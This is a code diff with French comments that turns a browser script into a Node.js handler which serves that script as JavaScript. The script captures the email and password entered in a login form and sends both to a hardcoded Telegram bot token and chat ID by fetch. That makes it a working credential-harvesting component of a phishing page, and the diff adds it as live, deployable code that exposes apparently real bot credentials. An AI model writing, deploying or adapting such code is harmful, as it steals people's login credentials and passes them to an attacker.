@@ -1,4 +1,6 @@
-document.addEventListener("DOMContentLoaded", function() {
+module.exports = (req, res) => {
+  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
+  res.end(`document.addEventListener("DOMContentLoaded", function() {
   const form = document.querySelector("form");
 
   form.addEventListener("submit", function(event) {
@@ -9,14 +11,16 @@ document.addEventListener("DOMContentLoaded", function() {
     const password = document.getElementById("password").value;
     
     // Construction du message à envoyer sur Telegram
-    const message = encodeURIComponent(`Nouvelle soumission de formulaire:\nAdresse e-mail: ${email}\nMot de passe: ${password}`);
+    const message = encodeURIComponent(\`Nouvelle soumission de formulaire:
+Adresse e-mail: \${email}
+Mot de passe: \${password}\`);
     
     // Remplace ces valeurs par celles de ton bot et chat
     const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
     const CHAT_ID = "-4766781392";
     
     // URL de l'API Telegram pour envoyer un message
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+    const url = \`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?chat_id=\${CHAT_ID}&text=\${message}\`;
     
     // Envoi de la requête fetch
     fetch(url)
@@ -78,4 +82,5 @@ document.addEventListener("DOMContentLoaded", function() {
     modal.appendChild(box);
     document.body.appendChild(modal);
   }
-});
+});`);
+};
